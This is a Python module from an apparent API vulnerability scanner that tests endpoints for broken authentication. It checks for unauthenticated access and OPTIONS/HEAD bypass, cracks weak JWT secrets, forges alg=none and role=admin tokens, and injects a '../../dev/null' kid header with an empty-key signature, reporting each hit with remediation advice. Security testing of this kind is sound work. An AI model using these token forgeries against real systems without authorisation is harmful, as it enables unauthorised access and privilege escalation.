"""Attack 2: Broken Authentication — JWT attacks + auth bypass."""
import sys

from ..config import AUTH_PATH_RE, BEARER_JWT_RE
from ..http_client import HTTPClient
from ..models import Finding, ScanContext
from ..utils.jwt import (jwt_parts, jwt_crack_weak_secret,
                         jwt_forge_alg_none, jwt_tamper_claims,
                         extract_jwt_from_auth)


def _log(msg):
    print(f"[*] Attack 2 (auth): {msg}", file=sys.stderr)


def _test_no_auth(client, ep, ctx):
    """Test if endpoint is accessible without any auth token."""
    resp = client.request("GET", ep.url)
    if 200 <= resp.status < 300 and resp.length > 50:
        ctx.add_finding(Finding(
            title="No authentication required on protected endpoint",
            severity="high",
            category="API2:2023 Broken Authentication",
            method="GET",
            path=ep.path,
            host=ep.host,
            status=resp.status,
            evidence=f"No auth header sent, got {resp.status} with {resp.length}B",
            remediation="Require authentication on all non-public endpoints.",
            attack_phase="broken_auth"))
        return True
    return False


def _test_method_bypass(client, ep, ctx):
    """Test if OPTIONS/HEAD bypass authentication (common on protected paths).
    Some servers misconfigure auth filters to only apply to GET/POST, allowing
    OPTIONS/HEAD to enumerate methods or retrieve metadata without auth."""
    found = 0
    for method in ("OPTIONS", "HEAD"):
        resp = client.request(method, ep.url)
        if 200 <= resp.status < 300:
            if method == "OPTIONS" and "allow" in resp.headers:
                ctx.add_finding(Finding(
                    title=f"Sensitive endpoint ({ep.path}) accessible via OPTIONS without auth",
                    severity="high",
                    category="API2:2023 Broken Authentication",
                    method=method,
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence=f"OPTIONS {ep.path} returned {resp.status}; "
                             f"Allow: {resp.headers.get('allow', '')}",
                    remediation="Enforce authentication on all HTTP methods, "
                               "including OPTIONS.",
                    attack_phase="broken_auth"))
                found += 1
            elif method == "HEAD":
                ctx.add_finding(Finding(
                    title=f"Sensitive endpoint ({ep.path}) accessible via HEAD without auth",
                    severity="high",
                    category="API2:2023 Broken Authentication",
                    method=method,
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence=f"HEAD {ep.path} returned {resp.status} (method-based auth bypass)",
                    remediation="Enforce authentication uniformly across all HTTP methods.",
                    attack_phase="broken_auth"))
                found += 1
    return found


def _test_jwt_attacks(client, token, ep, ctx):
    """Run JWT-specific attacks against a token."""
    found = 0

    # 1. Weak secret cracking
    secret = jwt_crack_weak_secret(token)
    if secret is not None:
        ctx.add_finding(Finding(
            title=f"JWT signed with weak secret: {secret!r}",
            severity="critical",
            category="API2:2023 Broken Authentication",
            method="GET",
            path=ep.path,
            host=ep.host,
            status=0,
            evidence=f"HMAC secret cracked via dictionary: {secret!r}",
            remediation="Use a strong, random secret (256+ bits). "
                        "Consider asymmetric signing (RS256).",
            attack_phase="broken_auth"))
        found += 1

    # 2. alg=none bypass
    forged = jwt_forge_alg_none(token)
    if forged:
        headers = {"Authorization": f"Bearer {forged}"}
        resp = client.request("GET", ep.url, headers=headers)
        if 200 <= resp.status < 300:
            ctx.add_finding(Finding(
                title="JWT alg=none bypass accepted",
                severity="critical",
                category="API2:2023 Broken Authentication",
                method="GET",
                path=ep.path,
                host=ep.host,
                status=resp.status,
                evidence=f"alg=none forged token accepted, got {resp.status}",
                remediation="Reject tokens with alg=none. "
                            "Whitelist allowed algorithms.",
                attack_phase="broken_auth"))
            found += 1

    # 3. Claim tampering (role escalation)
    tampered = jwt_tamper_claims(token, {"role": "admin", "is_admin": True})
    if tampered:
        headers = {"Authorization": f"Bearer {tampered}"}
        resp = client.request("GET", ep.url, headers=headers)
        if 200 <= resp.status < 300:
            ctx.add_finding(Finding(
                title="JWT claim tampering accepted (role=admin)",
                severity="critical",
                category="API2:2023 Broken Authentication",
                method="GET",
                path=ep.path,
                host=ep.host,
                status=resp.status,
                evidence=f"Tampered token with role=admin accepted, "
                         f"got {resp.status}",
                remediation="Always verify JWT signature server-side. "
                            "Never trust client-supplied claims.",
                attack_phase="broken_auth"))
            found += 1

    # 4. kid injection (path traversal)
    parsed = jwt_parts(token)
    if parsed:
        header, payload, _, _ = parsed
        if "kid" in header:
            from ..utils.jwt import _b64url_encode
            import json as _json
            import hmac
            import hashlib
            evil_header = dict(header)
            evil_header["kid"] = "../../dev/null"
            evil_header["alg"] = "HS256"
            h = _b64url_encode(_json.dumps(evil_header))
            p = _b64url_encode(_json.dumps(payload))
            signing_input = h + b"." + p
            sig = _b64url_encode(
                hmac.new(b"", signing_input, hashlib.sha256).digest())
            kid_token = (signing_input + b"." + sig).decode()
            headers = {"Authorization": f"Bearer {kid_token}"}
            resp = client.request("GET", ep.url, headers=headers)
            if 200 <= resp.status < 300:
                ctx.add_finding(Finding(
                    title="JWT kid path traversal accepted",
                    severity="critical",
                    category="API2:2023 Broken Authentication",
                    method="GET",
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence="kid=../../dev/null with empty-key HMAC accepted",
                    remediation="Sanitize kid parameter. Never use it as file path.",
                    attack_phase="broken_auth"))
                found += 1

    return found


def run_broken_auth(ctx: ScanContext):
    """Test for broken authentication vulnerabilities."""
    endpoints = ctx.api_endpoints()
    if not endpoints:
        endpoints = ctx.endpoints[:100]
    _log(f"Testing {len(endpoints)} endpoints")

    client = HTTPClient(timeout=ctx.timeout)
    found = 0

    # Test no-auth access on GET
    if ctx.auth:
        for ep in endpoints[:50]:
            if _test_no_auth(client, ep, ctx):
                found += 1

    # Test method-based bypass (OPTIONS/HEAD without auth on sensitive paths)
    from ..config import SENSITIVE_PATH_RE, BFLA_PATH_RE
    sensitive_eps = [e for e in endpoints
                     if SENSITIVE_PATH_RE.search(e.path) or
                        BFLA_PATH_RE.search(e.path)]
    for ep in sensitive_eps[:50]:
        found += _test_method_bypass(client, ep, ctx)

    # JWT attacks on provided tokens
    tokens = []
    if ctx.auth:
        jwt = extract_jwt_from_auth(ctx.auth)
        if jwt:
            tokens.append(jwt)
    if ctx.auth2:
        jwt = extract_jwt_from_auth(ctx.auth2)
        if jwt:
            tokens.append(jwt)
    tokens.extend(ctx.tokens)

    for token in set(tokens):
        test_ep = endpoints[0] if endpoints else None
        if test_ep:
            found += _test_jwt_attacks(client, token, test_ep, ctx)

    _log(f"Broken auth findings: {found}")
